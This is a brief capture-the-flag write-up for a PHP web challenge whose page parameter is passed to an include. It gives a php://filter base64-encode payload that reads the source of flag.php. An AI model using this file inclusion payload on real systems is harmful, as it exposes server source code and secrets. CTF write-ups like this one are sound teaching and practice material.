# Includimi

| | |
|---|---|
| **Section** | Web |
| **Category** | web |
| **Solves** | 6 |

## Overview

The application includes a file specified via the `page` GET parameter using a PHP `include`.

The interface indicates that the flag is located in:

```
flag.php
```

When visiting:

```
?page=flag.php
```

the page displays:

```
Benvenuti nel mio bellissimo sito scritto in PHP! Questa pagina contiene una variabile con la flag
```

This confirms that the flag is stored server-side inside `flag.php`, but it is not directly exposed in the rendered output.

## Solve

Using PHP stream wrappers, the source code of `flag.php` can be exfiltrated by encoding it in Base64:

```
php://filter/convert.base64-encode/resource=flag.php
```

Decoding the output reveals the PHP source containing the flag.